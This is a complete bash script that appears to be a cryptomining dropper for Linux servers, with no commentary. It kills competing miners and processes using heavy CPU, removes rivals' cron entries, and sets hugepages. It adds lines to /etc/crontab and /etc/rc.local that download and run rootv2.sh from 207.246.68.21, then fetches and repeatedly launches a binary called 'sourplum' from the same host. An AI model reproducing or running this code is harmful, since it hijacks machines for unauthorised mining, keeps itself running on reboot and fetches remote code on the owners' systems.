#!/bin/bash

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

function kills() {
/bin/ps aux |grep -v sourplum | awk '{if($3>20.0) print $2}' | while read procid
do
kill -9 $procid
done
crontab -l | sed '/212.237.2.23/d' | crontab -
crontab -l | sed '/94.177.187.110/d' | crontab -
pkill -f biosetjenkins
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs ps --ppid|awk '{print $1}'|grep -v PID|xargs kill -9
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs kill -9
pkill -f 45.76.102.45
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f sleep
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f 108.61.186.224
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
pkill -f 45.76.146.166
pkill -f irqbalanc1
pkill -f 188.120.247.175
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1
rm -f /tmp/irq
}

function writecrontab() {
	xcrontab=$(cat /etc/crontab | grep "http://207.246.68.21/rootv2.sh" | grep -v grep |wc -l)
	if [ $xcrontab -eq 0 ];then
        echo "0 0 * * *   root    curl http://207.246.68.21/rootv2.sh > /etc/root.sh ; wget -P /etc http://207.246.68.21/rootv2.sh ; rm /etc/root.sh.* ; bash /etc/root.sh &" >> /etc/crontab
	else
        echo ""
	fi
}

function writerc() {
	x=$(cat /etc/rc.local | grep "http://207.246.68.21/rootv2.sh" | grep -v grep | wc -l)
	if [ $x -eq 0 ];then
		$(sed -i "s/exit 0//g" /etc/rc.local) 
		$(sed -i "s/bash /etc/root.sh//g" /etc/rc.local) 
		echo "curl http://207.246.68.21/rootv2.sh > /etc/root.sh ; wget -P /etc http://207.246.68.21/rootv2.sh ; rm -rf /etc/root.sh.* ; bash /etc/root.sh" >> /etc/rc.local
		echo "exit 0" >> /etc/rc.local
	else
		echo ""
	fi
}

function hugepage() {
	echo 128 > /proc/sys/vm/nr_hugepages
	sysctl -w vm.nr_hugepages=128
}

function downloadyam() {
	if [ ! -f "sourplum" ] ;then
		curl http://207.246.68.21/sourplum > sourplum && chmod +x sourplum
		if [ ! -f "sourplum" ] ;then
			wget http://207.246.68.21/sourplum && chmod +x sourplum
			rm -rf sourplum.*
		fi
		./sourplum &
	else
		writecrontab
		writerc
		p=$(ps aux | grep sourplum | grep -v grep | wc -l)
		if [ ${p} -eq 1 ];then
			echo "sourplum"
		elif [ ${p} -eq 0 ];then
			./sourplum &
		else
			echo ""
		fi
	fi
}

hugepage

while [ 1 ]
do
	kills
	downloadyam
	sleep 5
done
